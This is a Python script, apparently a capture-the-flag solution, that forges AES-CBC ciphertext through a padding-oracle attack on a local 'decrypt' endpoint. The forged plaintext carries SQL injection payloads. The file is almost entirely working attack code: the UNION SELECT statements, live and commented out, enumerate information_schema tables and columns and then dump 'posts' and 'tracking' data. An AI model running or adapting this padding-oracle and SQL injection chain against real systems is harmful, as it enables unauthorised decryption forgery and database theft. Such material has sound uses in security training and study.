import base64
import logging

from Crypto.Util.Padding import pad

from padding_oracle import AESPaddingOracle, Base64OracleClient

logger = logging.getLogger('padding-oracle')
logger.setLevel('INFO')

if __name__ == "__main__":
    bas64_ciphertext = "B7TRtKO5ub9drSnAEnRSLweuSMA!k5dWN87R7kLQL1!WJur4kTuzjPQecfPRw4DqxEFh6B57RpTz0HwYsb!iWi0jSpXvilsw2WZa6Akh0FT31JuJqoCgd-9VxYznYA1lFevImB-vHeFZ2jU5r4psuCUKyotOXn5OUBBr5IuSsUp6vQ1yupJwqis6fNl9ikU7u4bFMIYUr1eXgNP8fe-TDQ~~"
    bas64_ciphertext = bas64_ciphertext.replace('~', '=').replace('!', '/').replace('-', '+')
    ciphertext = base64.b64decode(bas64_ciphertext)

    key = bytes.fromhex('00000000000000000000000000000000')
    key = base64.b64encode(key).decode('utf8')
    key = key.replace('=', '~').replace('/', '!').replace('+', '-')

    oracle_client = Base64OracleClient("http://localhost:5000/decrypt?post=")
    padding_oracle = AESPaddingOracle(oracle_client)

    # sql_statement = "UNION SELECT GROUP_CONCAT(body SEPARATOR ', ') as title, body FROM posts"
    # sql_statement = "UNION SELECT GROUP_CONCAT(title SEPARATOR ', ') as title, body FROM posts"
    # sql_statement = "UNION SELECT GROUP_CONCAT(id SEPARATOR ', ') as title, body FROM posts"
    # sql_statement = "UNION SELECT GROUP_CONCAT(COLUMN_NAME) AS title, EXTRA AS body FROM information_schema.columns WHERE TABLE_NAME = 'posts'"
    # sql_statement = "UNION SELECT GROUP_CONCAT(TABLE_NAME) AS title, ENGINE as body FROM information_schema.tables WHERE table_schema=DATABASE()"
    # sql_statement = "UNION SELECT GROUP_CONCAT(COLUMN_NAME) AS title,EXTRA AS body FROM information_schema.columns WHERE TABLE_NAME='tracking'"
    # sql_statement = "UNION SELECT GROUP_CONCAT(TABLE_NAME) AS title, ENGINE as body FROM information_schema.tables WHERE table_schema=DATABASE()"
    sql_statement = "UNION SELECT GROUP_CONCAT(headers SEPARATOR ',') as title,id as body FROM tracking"
    sql_statement_length = len(sql_statement)
    flag = "^FLAG^0000000000000000000000000000000000000000000000000000000000000000$FLAG$" + key
    flag = flag[:-sql_statement_length]
    plaintext = f'{{"flag" : "{flag}", "id" : "0 {sql_statement}", "key" : ""}}'.encode('utf8')
    plaintext = pad(plaintext, 16)

    ciphertext = padding_oracle.encrypt(plaintext, ciphertext)
    ciphertext = base64.b64encode(ciphertext).decode('utf8')
    ciphertext = ciphertext.replace('=', '~').replace('/', '!').replace('+', '-')

    print(f"Base 64 encoded and modified ciphertext: {ciphertext}")